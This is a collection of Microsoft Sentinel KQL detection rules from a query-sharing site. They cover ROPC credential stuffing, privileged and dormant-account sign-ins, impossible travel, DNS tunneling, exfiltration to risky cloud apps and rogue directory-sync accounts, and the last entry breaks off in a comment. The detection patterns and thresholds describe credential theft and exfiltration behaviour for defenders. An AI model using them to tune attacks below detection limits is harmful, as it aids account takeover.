// Source: https://www.kqlsearch.com/query/24-ROPC-CredentialStuffing&cmqtuggru001rbljhq2wui50f
// Section: KQL
// Author: David Alonso
// Description:
// Detects credential-stuffing patterns over the ROPC (Resource Owner Password Credential)
// grant: large numbers of failed password-grant attempts from a single IP across many
// distinct user accounts. ROPC is the preferred protocol for command-line credential
// stuffing tools because it bypasses MFA and avoids interactive prompts. ROPC failures
// are logged in SigninLogs as well as AADNonInteractiveUserSignInLogs, so this rule
// correlates both tables.
//
// Trigger:
// >= 20 ROPC failures (50126 / 50053 / 50056 / 50055 / 50064) AND
// >= 8 distinct UPNs targeted from the same source IP in 1 hour.
//
// Tuning:
// - MinFailures / MinUsers were raised (15/5 -> 20/8) to offset the extra volume that
// comes from including SigninLogs. Adjust to your lockout / spray baseline.
// - Edit LegitRopcApps to suppress known-good ROPC clients before counting.
// - Allowlist IPs are stripped via ExcludeAllowlistedIPs_AADNI().
// MITRE ATT&CK: T1110.003 (Password Spraying), T1078 (Valid Accounts)

let LegitRopcApps = dynamic([
    "Microsoft Authentication Broker",
    "Microsoft Intune Company Portal",
    "Azure AD Connect",
    "Microsoft Office",
    "Microsoft Office Authentication Broker"
]);
let SprayErrors = dynamic(["50126","50053","50056","50055","50064"]);
// ROPC failures land in SigninLogs as well as the non-interactive table; union both.
let MinFailures = 20;   // raised 15 -> 20 to offset the extra SigninLogs volume
let MinUsers    = 8;    // raised 5 -> 8
let RopcFailures =
    union isfuzzy=true
        (SigninLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType),
        (AADNonInteractiveUserSignInLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType);
RopcFailures
| invoke ExcludeAllowlistedIPs_AADNI()
| where ResultType in (SprayErrors)
| where AppDisplayName !in~ (LegitRopcApps)
| summarize
    FailCount = count(),
    Users     = dcount(UserPrincipalName),
    UserList  = make_set(UserPrincipalName, 50),
    Apps      = make_set(AppDisplayName),
    Errors    = make_set(ResultType),
    FirstSeen = min(TimeGenerated),
    LastSeen  = max(TimeGenerated)
  by IPAddress, Location
| where FailCount >= MinFailures and Users >= MinUsers
| order by FailCount desc

// Title: 25-ROPC-PrivilegedUser.yaml
// Source: https://www.kqlsearch.com/query/25-ROPC-PrivilegedUser&cmqtugp9e001sbljhehjk2r5o
// Section: KQL
// Author: David Alonso
// Description:
// Detects a successful ROPC (password-grant) sign-in for any account holding a
// privileged Entra ID role. Privileged users should authenticate via interactive flows
// that honour MFA / Conditional Access. A ROPC sign-in by a Global Administrator,
// Privileged Role Administrator, Security Administrator (etc.) is a credible
// account-takeover indicator and should be treated as high severity. ROPC sign-ins
// surface in SigninLogs as well as AADNonInteractiveUserSignInLogs, so both are correlated.
//
// Trigger: any successful ROPC sign-in (ResultType == 0) where the UPN appears in
// IdentityInfo.AssignedRoles within the last 14 days.
//
// Tuning:
// - LegitRopcApps suppresses known-good ROPC clients.
// - Requires UEBA / IdentityInfo to be populated. If you have a custom privileged-user
// watchlist, replace the PrivUsers CTE with a watchlist lookup.
// MITRE ATT&CK: T1078.004 (Cloud Accounts), T1098 (Account Manipulation)

let LegitRopcApps = dynamic([
    "Microsoft Authentication Broker",
    "Microsoft Intune Company Portal",
    "Azure AD Connect",
    "Microsoft Office",
    "Microsoft Office Authentication Broker"
]);
let PrivUsers =
    IdentityInfo
    | where TimeGenerated > ago(14d)
    | where isnotempty(AssignedRoles)
    | summarize arg_max(TimeGenerated, AssignedRoles) by AccountUPN
    | extend Upn = tolower(AccountUPN)
    | project Upn, AssignedRoles;
// Privileged ROPC is rare and high-signal; correlate both sign-in tables.
let RopcSignIns =
    union isfuzzy=true
        (SigninLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType),
        (AADNonInteractiveUserSignInLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType);
RopcSignIns
| invoke ExcludeAllowlistedIPs_AADNI()
| where ResultType == 0
| where AppDisplayName !in~ (LegitRopcApps)
| extend Upn = tolower(UserPrincipalName)
| join kind=inner PrivUsers on Upn
| summarize
    Count     = count(),
    IPs       = make_set(IPAddress),
    Countries = make_set(Location),
    Apps      = make_set(AppDisplayName),
    Roles     = any(AssignedRoles),
    FirstSeen = min(TimeGenerated),
    LastSeen  = max(TimeGenerated)
  by UserPrincipalName
| extend IPAddress = tostring(IPs[0])
| order by Count desc

// Title: 26-ROPC-NewCountryOrASN.yaml
// Source: https://www.kqlsearch.com/query/26-ROPC-NewCountryOrASN&cmqtugwaz001tbljhai1xtpcg
// Section: KQL
// Author: David Alonso
// Description:
// Detects a successful ROPC sign-in whose (Country, ASN) pair has not been observed for
// that user in the prior 14 days of SigninLogs or AADNonInteractiveUserSignInLogs.
// Because ROPC bypasses MFA / Conditional Access, a first-seen-location signal is one of
// the few remaining indicators that a stolen credential is being replayed from a new
// attacker location.
//
// Trigger: any successful ROPC sign-in (ResultType == 0) where the {UPN, Location, ASN}
// combination is unseen in the last 14 days (Sentinel scheduled-rule lookback max is 14d).
//
// Tuning:
// - LegitRopcApps suppresses known-good ROPC clients.
// - Allowlist IPs are stripped via ExcludeAllowlistedIPs_AADNI().
// MITRE ATT&CK: T1078 (Valid Accounts), T1550 (Use Alternate Auth Material)

let LegitRopcApps = dynamic([
    "Microsoft Authentication Broker",
    "Microsoft Intune Company Portal",
    "Azure AD Connect",
    "Microsoft Office",
    "Microsoft Office Authentication Broker"
]);
let Lookback = 14d;
let Window   = 1h;
let Baseline =
    union isfuzzy=true
        (SigninLogs
            | where TimeGenerated between (ago(Lookback) .. ago(Window))),
        (AADNonInteractiveUserSignInLogs
            | where TimeGenerated between (ago(Lookback) .. ago(Window)))
    | where ResultType == 0
    | extend Upn = tolower(UserPrincipalName),
             Pair = strcat(Location, "|", tostring(AutonomousSystemNumber))
    | summarize KnownPairs = make_set(Pair) by Upn;
// ROPC sign-ins surface in SigninLogs more than the non-interactive table; correlate both.
let RopcSignIns =
    union isfuzzy=true
        (SigninLogs
            | where TimeGenerated > ago(Window)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType, AutonomousSystemNumber),
        (AADNonInteractiveUserSignInLogs
            | where TimeGenerated > ago(Window)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType, AutonomousSystemNumber);
RopcSignIns
| invoke ExcludeAllowlistedIPs_AADNI()
| where ResultType == 0
| where AppDisplayName !in~ (LegitRopcApps)
| where isnotempty(Location)
| extend Upn = tolower(UserPrincipalName),
         Pair = strcat(Location, "|", tostring(AutonomousSystemNumber))
| join kind=leftouter Baseline on Upn
| where isnull(KnownPairs) or not(set_has_element(KnownPairs, Pair))
| summarize
    Count     = count(),
    IPs       = make_set(IPAddress),
    Countries = make_set(Location),
    ASNs      = make_set(AutonomousSystemNumber),
    Apps      = make_set(AppDisplayName),
    FirstSeen = min(TimeGenerated),
    LastSeen  = max(TimeGenerated)
  by UserPrincipalName
| extend IPAddress = tostring(IPs[0])
| order by Count desc

// Title: 27-ROPC-DormantAccount.yaml
// Source: https://www.kqlsearch.com/query/27-ROPC-DormantAccount&cmqtuh2h3001ubljh2oqh845m
// Section: KQL
// Author: David Alonso
// Description:
// Detects a successful ROPC sign-in for an account that has had no interactive or
// non-interactive successful sign-in in the prior 14 days. Dormant accounts are a
// preferred target for credential-stuffing and breach-replay attacks: leaked passwords
// for inactive employees / contractors often still work because no one notices the
// sign-ins.
//
// Trigger: successful ROPC sign-in (ResultType == 0) where UPN does not appear in
// SigninLogs OR AADNonInteractiveUserSignInLogs successes in the prior 14 days
// (Sentinel scheduled-rule lookback max is 14d).
//
// Tuning:
// - LegitRopcApps suppresses known-good ROPC clients.
// - Service / sync accounts that intentionally sit dormant should be allowlisted via
// LegitRopcUsers.
// MITRE ATT&CK: T1078 (Valid Accounts), T1110 (Brute Force)

let LegitRopcApps = dynamic([
    "Microsoft Authentication Broker",
    "Microsoft Intune Company Portal",
    "Azure AD Connect",
    "Microsoft Office",
    "Microsoft Office Authentication Broker"
]);
let LegitRopcUsers = dynamic([]);
let Active =
    union isfuzzy=true
        (SigninLogs
            | where TimeGenerated between (ago(14d) .. ago(1h))),
        (AADNonInteractiveUserSignInLogs
            | where TimeGenerated between (ago(14d) .. ago(1h)))
    | where ResultType == 0
    | distinct Upn = tolower(UserPrincipalName);
// ROPC sign-ins surface in SigninLogs more than the non-interactive table; correlate both.
let RopcSignIns =
    union isfuzzy=true
        (SigninLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType),
        (AADNonInteractiveUserSignInLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType);
RopcSignIns
| invoke ExcludeAllowlistedIPs_AADNI()
| where ResultType == 0
| where AppDisplayName !in~ (LegitRopcApps)
| extend Upn = tolower(UserPrincipalName)
| where Upn !in (LegitRopcUsers)
| where Upn !in (Active)
| summarize
    Count     = count(),
    IPs       = make_set(IPAddress),
    Countries = make_set(Location),
    Apps      = make_set(AppDisplayName),
    FirstSeen = min(TimeGenerated),
    LastSeen  = max(TimeGenerated)
  by UserPrincipalName
| extend IPAddress = tostring(IPs[0])
| order by Count desc

// Title: 28-ROPC-ImpossibleTravel.yaml
// Source: https://www.kqlsearch.com/query/28-ROPC-ImpossibleTravel&cmqtuh8dp001vbljhyu5wu5m7
// Section: KQL
// Author: David Alonso
// Description:
// Detects the same user successfully authenticating via ROPC from two or more distinct
// countries inside a 1-hour window. Because ROPC requires the cleartext password on every
// call, multi-country activity within an hour implies parallel use of stolen credentials
// from different attacker locations (or a compromised script running from multiple egress
// points). ROPC sign-ins surface in SigninLogs as well as AADNonInteractiveUserSignInLogs,
// so both tables are correlated.
//
// Trigger: >= 2 distinct Location values AND >= 2 distinct IPs for the same UPN inside 1 hour.
//
// Tuning:
// - The distinct-IP requirement suppresses geo-IP jitter where a single IP resolves to
// two countries. Remove it if you want the loosest possible detection.
// - LegitRopcApps suppresses known-good ROPC clients.
// - Allowlist IPs are stripped via ExcludeAllowlistedIPs_AADNI(). Add corporate
// VPN egress IPs to NetworkAllowlist if multi-country VPN clusters cause noise.
// MITRE ATT&CK: T1078 (Valid Accounts), T1550 (Use Alternate Auth Material)

let LegitRopcApps = dynamic([
    "Microsoft Authentication Broker",
    "Microsoft Intune Company Portal",
    "Azure AD Connect",
    "Microsoft Office",
    "Microsoft Office Authentication Broker"
]);
// ROPC sign-ins surface in SigninLogs more than the non-interactive table; correlate both.
let RopcSignIns =
    union isfuzzy=true
        (SigninLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType),
        (AADNonInteractiveUserSignInLogs
            | where TimeGenerated > ago(1h)
            | where AuthenticationProtocol =~ "ropc"
            | project TimeGenerated, UserPrincipalName, IPAddress, Location, AppDisplayName, ResultType);
RopcSignIns
| invoke ExcludeAllowlistedIPs_AADNI()
| where ResultType == 0
| where AppDisplayName !in~ (LegitRopcApps)
| where isnotempty(Location)
| summarize
    Count        = count(),
    Countries    = make_set(Location),
    CountryCount = dcount(Location),
    IPs          = make_set(IPAddress),
    IPCount      = dcount(IPAddress),
    Apps         = make_set(AppDisplayName),
    FirstSeen    = min(TimeGenerated),
    LastSeen     = max(TimeGenerated)
  by UserPrincipalName
| where CountryCount >= 2 and IPCount >= 2
| extend IPAddress = tostring(IPs[0])
| order by CountryCount desc, Count desc

// Title: 33-CSL-ZPA-FirstTimeAppAccess.yaml
// Source: https://www.kqlsearch.com/query/33-CSL-ZPA-FirstTimeAppAccess&cmqtuoknf002zbljhwd49ch4g
// Section: KQL
// Author: David Alonso
// Description:
// Detects ZPA users successfully accessing internal applications they have never connected to in the previous 14 days. In a well-managed ZPA deployment, users have defined app segment policies; accessing new applications outside their normal pattern can indicate logical lateral movement — an attacker using valid credentials to explore internal resources, privilege escalation that granted access to additional app segments, or a legitimate administrator testing new policies. MITRE ATT&CK: T1078 (Valid Accounts), T1021 (Remote Services).

let recentWindow   = 1h;
  let baselineWindow = 14d;
  let baseline = CommonSecurityLog
      | where TimeGenerated between (ago(baselineWindow) .. ago(recentWindow))
      | where DeviceVendor == "Zscaler" and DeviceProduct has "ZPA"
      | where DeviceAction !in ("block", "BLOCK", "Blocked", "Failed", "Error")
      | where isnotempty(SourceUserName) and isnotempty(DestinationHostName)
      | summarize HistoricApps = make_set(DestinationHostName)
          by SourceUserName;
  let recent = CommonSecurityLog
      | where TimeGenerated > ago(recentWindow)
      | where DeviceVendor == "Zscaler" and DeviceProduct has "ZPA"
      | where DeviceAction !in ("block", "BLOCK", "Blocked", "Failed", "Error")
      | where isnotempty(SourceUserName) and isnotempty(DestinationHostName)
      | summarize
          RecentApps      = make_set(DestinationHostName),
          ConnectionCount = count(),
          SourceIPs       = make_set(SourceIP, 5)
          by SourceUserName;
  recent
  | join kind=leftouter baseline on SourceUserName
  | extend HistoricApps = coalesce(HistoricApps, dynamic([]))
  | extend FirstTimeApps = set_difference(RecentApps, HistoricApps)
  | where array_length(FirstTimeApps) > 0
  | project SourceUserName, FirstTimeApps, ConnectionCount, SourceIPs, RecentApps
  | order by ConnectionCount desc

// Title: 46-NK-VisibilityLoss-NoTraffic.yaml
// Source: https://www.kqlsearch.com/query/46-NK-VisibilityLoss-NoTraffic&cmqtvts810098bljh7vdewq4q
// Section: KQL
// Author: David Alonso
// Description:
// Detects users who previously had consistent Netskope web transaction activity but have
// generated zero traffic in the recent window. Visibility loss may indicate the Netskope
// Client has been uninstalled, disabled, or bypassed, or the user is routing traffic
// through an alternate channel to avoid inspection.
// MITRE ATT&CK: T1562 (Impair Defenses), T1562.001 (Disable or Modify Tools)

let _NetskopeEmpty = datatable(TimeGenerated:datetime, action_s:string, category_s:string, severity_s:string, malware_name_s:string, malware_type_s:string, threat_name_s:string, user_s:string, domain_s:string, dstip_s:string, srcip_s:string, bytes_uploaded_d:real, bytes_downloaded_d:real, app_s:string, url_s:string, dlp_rule_s:string, dlp_profile_s:string, activity_s:string, file_type_s:string, object_s:string)[];
let baselineWindow = 7d;
let recentWindow   = 4h;
let minBaselineReqsPerDay = 20;
// Users with consistent Netskope activity in the baseline window
let BaselineUsers =
    union isfuzzy=true _NetskopeEmpty, NetskopeWebTx_CL
    | where TimeGenerated between (ago(baselineWindow) .. ago(recentWindow))
    | where isnotempty(user_s)
    | summarize
        BaselineReqPerDay = round(toreal(count()) / (baselineWindow / 1d), 1),
        BaselineApps           = make_set(app_s, 10),
        BaselineIPs            = make_set(srcip_s, 5)
      by user_s
    | where BaselineReqPerDay >= minBaselineReqsPerDay;
// Users with ANY activity in the recent window
let RecentActiveUsers =
    union isfuzzy=true _NetskopeEmpty, NetskopeWebTx_CL
    | where TimeGenerated > ago(recentWindow)
    | where isnotempty(user_s)
    | distinct user_s;
// Users who went silent
BaselineUsers
| join kind=leftanti RecentActiveUsers on user_s
| project
    user_s, BaselineReqPerDay, BaselineApps, BaselineIPs
| order by BaselineReqPerDay desc

// Title: 60-NK-BI-VisibilityLoss-NoTraffic.yaml
// Source: https://www.kqlsearch.com/query/60-NK-BI-VisibilityLoss-NoTraffic&cmqtvw1x1009mbljh7t62x2d7
// Section: KQL
// Author: David Alonso
// Description:
// Detects users with consistent baseline activity who stopped generating Netskope traffic,
// indicating possible client bypass, disable, or credential compromise.
// Uses the built-in NetskopeEvents_CL table.
// MITRE ATT&CK: T1562 (Impair Defenses), T1562.001 (Disable or Modify Tools)

let _NetskopeEmpty = datatable(TimeGenerated:datetime, action_s:string, category_s:string, severity_s:string, malware_name_s:string, malware_type_s:string, threat_name_s:string, user_s:string, domain_s:string, dstip_s:string, srcip_s:string, bytes_uploaded_d:real, bytes_downloaded_d:real, app_s:string, url_s:string, dlp_rule_s:string, dlp_profile_s:string, activity_s:string, file_type_s:string, object_s:string, dst_country_s:string, src_country_s:string, ccl_s:string, access_method_s:string, traffic_type_s:string)[];
let baselineWindow = 7d;
let recentWindow   = 4h;
let minBaselineReqsPerDay = 20;
let BaselineUsers =
    union isfuzzy=true _NetskopeEmpty, NetskopeEvents_CL
    | where TimeGenerated between (ago(baselineWindow) .. ago(recentWindow))
    | where isnotempty(user_s)
    | summarize
        BaselineReqPerDay = round(toreal(count()) / (baselineWindow / 1d), 1),
        BaselineApps           = make_set(app_s, 10),
        BaselineIPs            = make_set(srcip_s, 5)
      by user_s
    | where BaselineReqPerDay >= minBaselineReqsPerDay;
let RecentActiveUsers =
    union isfuzzy=true _NetskopeEmpty, NetskopeEvents_CL
    | where TimeGenerated > ago(recentWindow)
    | where isnotempty(user_s)
    | distinct user_s;
BaselineUsers
| join kind=leftanti RecentActiveUsers on user_s
| project
    user_s, BaselineReqPerDay, BaselineApps, BaselineIPs
| order by BaselineReqPerDay desc

// Title: 65-NK-BI-DNSTunneling-LongHostnames.yaml
// Source: https://www.kqlsearch.com/query/65-NK-BI-DNSTunneling-LongHostnames&cmqtvwsxi009rbljhw4yb65jh
// Section: KQL
// Author: David Alonso
// Description:
// Detects DNS tunneling indicators by identifying requests to domains with unusually
// long hostnames (>50 chars) or excessive subdomain depth (>5 levels).
// Uses the built-in NetskopeEvents_CL table.
// MITRE ATT&CK: T1071.004 (DNS Application Layer Protocol)

let _NetskopeEmpty = datatable(TimeGenerated:datetime, action_s:string, category_s:string, severity_s:string, malware_name_s:string, malware_type_s:string, threat_name_s:string, user_s:string, domain_s:string, dstip_s:string, srcip_s:string, bytes_uploaded_d:real, bytes_downloaded_d:real, app_s:string, url_s:string, dlp_rule_s:string, dlp_profile_s:string, activity_s:string, file_type_s:string, object_s:string, dst_country_s:string, src_country_s:string, ccl_s:string, access_method_s:string, traffic_type_s:string)[];
union isfuzzy=true _NetskopeEmpty, NetskopeEvents_CL
| where TimeGenerated > ago(1d)
| where isnotempty(domain_s)
| extend
    HostnameLength  = strlen(domain_s),
    SubdomainParts  = countof(domain_s, ".")
| where HostnameLength > 50 or SubdomainParts > 5
| summarize
    QueryCount       = count(),
    UniqueSubdomains = dcount(domain_s),
    LongestHostname  = max(HostnameLength),
    SampleDomains    = make_set(domain_s, 10),
    Users            = make_set(user_s, 10),
    SourceIPs        = make_set(srcip_s, 10),
    FirstSeen        = min(TimeGenerated),
    LastSeen         = max(TimeGenerated)
  by srcip_s
| where QueryCount > 10
| order by LongestHostname desc, QueryCount desc

// Title: 74-NK-ImpossibleTravel.yaml
// Source: https://www.kqlsearch.com/query/74-NK-ImpossibleTravel&cmqtvydkx00a0bljhujn2z19p
// Section: KQL
// Author: David Alonso
// Description:
// Detects users generating Netskope web traffic from geographically distant source countries
// within a short time window, indicating potential credential compromise or VPN/proxy abuse.
// Flags when the same user appears from different countries within 2 hours.
// Uses the custom NetskopeWebTx_CL table via Blob Storage ingestion.
// MITRE ATT&CK: T1078 (Valid Accounts), T1078.004 (Cloud Accounts)

let _NetskopeEmpty = datatable(TimeGenerated:datetime, action_s:string, category_s:string, severity_s:string, malware_name_s:string, malware_type_s:string, threat_name_s:string, user_s:string, domain_s:string, dstip_s:string, srcip_s:string, bytes_uploaded_d:real, bytes_downloaded_d:real, app_s:string, url_s:string, dlp_rule_s:string, dlp_profile_s:string, activity_s:string, file_type_s:string, object_s:string, dst_country_s:string, src_country_s:string, ccl_s:string, access_method_s:string, traffic_type_s:string)[];
let TravelWindow = 2h;
union isfuzzy=true _NetskopeEmpty, NetskopeWebTx_CL
| where TimeGenerated > ago(1d)
| where isnotempty(user_s) and isnotempty(src_country_s)
| where src_country_s != "Unknown" and src_country_s != ""
| summarize
    Countries        = make_set(src_country_s, 10),
    CountryCount     = dcount(src_country_s),
    SourceIPs        = make_set(srcip_s, 20),
    UniqueIPs        = dcount(srcip_s),
    RequestCount     = count(),
    Apps             = make_set(app_s, 10),
    AccessMethods    = make_set(access_method_s, 5),
    FirstSeen        = min(TimeGenerated),
    LastSeen         = max(TimeGenerated)
  by user_s, bin(TimeGenerated, TravelWindow)
| where CountryCount >= 2
| extend TravelWindowMinutes = datetime_diff('minute', LastSeen, FirstSeen)
| project
    user_s, Countries, CountryCount, SourceIPs, UniqueIPs,
    RequestCount, Apps, AccessMethods,
    TravelWindowMinutes, FirstSeen, LastSeen
| order by CountryCount desc, UniqueIPs desc

// Title: 77-NK-RiskyCloudAppDataTransfer.yaml
// Source: https://www.kqlsearch.com/query/77-NK-RiskyCloudAppDataTransfer&cmqtvytrp00a3bljhnxx2ir1y
// Section: KQL
// Author: David Alonso
// Description:
// Detects high-volume data uploads to cloud applications with low or poor Cloud Confidence
// Level (CCL). Large data transfers to unvetted cloud storage or file sharing apps may
// indicate data exfiltration or policy-violating shadow IT data movement.
// Uses the custom NetskopeWebTx_CL table via Blob Storage ingestion.
// MITRE ATT&CK: T1567.002 (Exfiltration to Cloud Storage), T1537 (Transfer Data to Cloud Account)

let _NetskopeEmpty = datatable(TimeGenerated:datetime, action_s:string, category_s:string, severity_s:string, malware_name_s:string, malware_type_s:string, threat_name_s:string, user_s:string, domain_s:string, dstip_s:string, srcip_s:string, bytes_uploaded_d:real, bytes_downloaded_d:real, app_s:string, url_s:string, dlp_rule_s:string, dlp_profile_s:string, activity_s:string, file_type_s:string, object_s:string, dst_country_s:string, src_country_s:string, ccl_s:string, access_method_s:string, traffic_type_s:string)[];
let RiskyCCL = dynamic(["poor", "low", "unknown"]);
let ExfilCategories = dynamic([
    "Cloud Storage", "File Sharing", "Online Storage and Backup",
    "Personal Sites & Blogs", "Webmail"]);
union isfuzzy=true _NetskopeEmpty, NetskopeWebTx_CL
| where TimeGenerated > ago(1d)
| where isnotempty(user_s) and isnotempty(app_s)
| where action_s !in ("block", "Block", "blocked", "Blocked")
| where ccl_s in (RiskyCCL) or isempty(ccl_s)
| where category_s in (ExfilCategories) or activity_s has_any ("Upload", "Share", "Post")
| summarize
    UploadCount       = count(),
    TotalMBUploaded   = round(sum(todouble(bytes_uploaded_d)) / 1048576, 2),
    UniqueFiles       = dcount(object_s),
    FileNames         = make_set(object_s, 10),
    FileTypes         = make_set(file_type_s, 10),
    Apps              = make_set(app_s, 10),
    Domains           = make_set(domain_s, 10),
    Categories        = make_set(category_s, 5),
    CCLValues         = make_set(ccl_s, 5),
    SourceIPs         = make_set(srcip_s, 5),
    FirstSeen         = min(TimeGenerated),
    LastSeen          = max(TimeGenerated)
  by user_s
| where TotalMBUploaded > 100 or UploadCount > 50
| order by TotalMBUploaded desc, UploadCount desc

// Title: 78-NK-GeoAnomalyHighRiskCountry.yaml
// Source: https://www.kqlsearch.com/query/78-NK-GeoAnomalyHighRiskCountry&cmqtvz12v00a4bljh10y4z1lv
// Section: KQL
// Author: David Alonso
// Description:
// Detects web traffic routed to destination servers in high-risk countries. Identifies
// users whose traffic terminates in sanctioned or known adversary-aligned nations,
// which may indicate C2 communication, data exfiltration, or compromised infrastructure.
// Uses the custom NetskopeWebTx_CL table via Blob Storage ingestion.
// MITRE ATT&CK: T1071 (Application Layer Protocol), T1048 (Exfiltration Over Alternative Protocol)

let _NetskopeEmpty = datatable(TimeGenerated:datetime, action_s:string, category_s:string, severity_s:string, malware_name_s:string, malware_type_s:string, threat_name_s:string, user_s:string, domain_s:string, dstip_s:string, srcip_s:string, bytes_uploaded_d:real, bytes_downloaded_d:real, app_s:string, url_s:string, dlp_rule_s:string, dlp_profile_s:string, activity_s:string, file_type_s:string, object_s:string, dst_country_s:string, src_country_s:string, ccl_s:string, access_method_s:string, traffic_type_s:string)[];
let HighRiskCountries = dynamic([
    "RU", "CN", "KP", "IR", "SY", "CU", "VE", "BY",
    "Russia", "China", "North Korea", "Iran", "Syria", "Cuba", "Venezuela", "Belarus"]);
union isfuzzy=true _NetskopeEmpty, NetskopeWebTx_CL
| where TimeGenerated > ago(1d)
| where isnotempty(user_s) and isnotempty(dst_country_s)
| where dst_country_s in (HighRiskCountries)
| where action_s !in ("block", "Block", "blocked", "Blocked")
| summarize
    RequestCount      = count(),
    TotalMBUploaded   = round(sum(todouble(bytes_uploaded_d)) / 1048576, 2),
    TotalMBDownloaded = round(sum(todouble(bytes_downloaded_d)) / 1048576, 2),
    UniqueDomains     = dcount(domain_s),
    Domains           = make_set(domain_s, 20),
    DestIPs           = make_set(dstip_s, 10),
    Apps              = make_set(app_s, 10),
    Categories        = make_set(category_s, 10),
    SourceIPs         = make_set(srcip_s, 5),
    SrcIP             = take_any(srcip_s),
    FirstSeen         = min(TimeGenerated),
    LastSeen          = max(TimeGenerated)
  by user_s, dst_country_s
| where RequestCount >= 5
| order by TotalMBUploaded desc, RequestCount desc

// Title: AADConnectorAccount-OutsideOfWatchList.yaml
// Source: https://www.kqlsearch.com/query/AADConnectorAccount-OutsideOfWatchList&cln4h42zx000a5i0oyzaa5kdx
// Section: KQL
// Author: Thomas Naunheim
// Description:
// List of objects with Directory role membership to "Directory Synchronization" or naming similar to Microsoft Entra Connect account which aren't stored in the WatchList was found. Indicator of creating AAD connector account as backdoor.

// Query all users that habe the "Directory Synchronization Accounts" role assigned
let DirSyncRoleAssignedMembers = (IdentityInfo
    | where TimeGenerated > ago(14d)
    | summarize arg_max(TimeGenerated, *) by AccountObjectId
    | where AssignedRoles has "Directory Synchronization Accounts"
    | summarize by AccountObjectId);
// Query all users that have signed in to the AADSync API
let DirSyncNamedUsers = (union isfuzzy=true AADNonInteractiveUserSignInLogs, SigninLogs
    | where TimeGenerated > ago(1d)
    // AADC APIs: AADSync = "cb1056e2-e479-49de-ae31-7812af012ed8", AAD Connect v2 = 6eb59a73-39b2-4c23-a70f-e2e3ce8965b1
    | where (UserPrincipalName startswith "sync_" and UserPrincipalName endswith "onmicrosoft.com")
        or AppId == "cb1056e2-e479-49de-ae31-7812af012ed8"
        or AppId == "6eb59a73-39b2-4c23-a70f-e2e3ce8965b1"
    | summarize by AccountObjectId = UserId);
// Query all explicitly tagged Microsoft Entra Connect / Azure AD Connect account in the watchlist ServiceAccounts
let WatchList = _GetWatchlist('ServiceAccounts')
    | where ['Tags'] has "Azure AD Connect"
    | project AccountObjectId = ['Service AAD Object Id'];
// Combine the two lists and remove all known accounts
// All resulting accounts are not possibly not allowed to use this API or have the role assigned
union isfuzzy=true DirSyncRoleAssignedMembers, DirSyncNamedUsers
| summarize by AccountObjectId
| where AccountObjectId !in (WatchList)
| join kind=leftouter (IdentityInfo
    | where TimeGenerated > ago(14d)
    | summarize arg_max(TimeGenerated, *) by AccountObjectId
    )
    on AccountObjectId
| project-away *1, TimeGenerated

// Title: AADNonInteractiveUserSignInLogs-Unexpected authentication from Windows Azure Active Directory app.kql
// Source: https://www.kqlsearch.com/query/AADNonInteractiveUserSignInLogs-Unexpected%20authentication%20from%20Windows%20Azure%20Active%20Directory%20app&cm69qinfo008fnw0f4afukiz2
// Section: KQL
// Author: Jose Sebastián Canós
// Description:
// Since 6th January 2025 threat actors have started using this app (or a specific endpoint) to perform password spray with characteristic properties.
// let _SuccessResultTypes = toscalar(
// _GetWatchlist("ResultType-SignInLogsErrorCodes")
// | where Notes has_any ("[Expired]", "[Success]") and isnotempty(ResultDescription)
// | summarize make_list(ResultType)
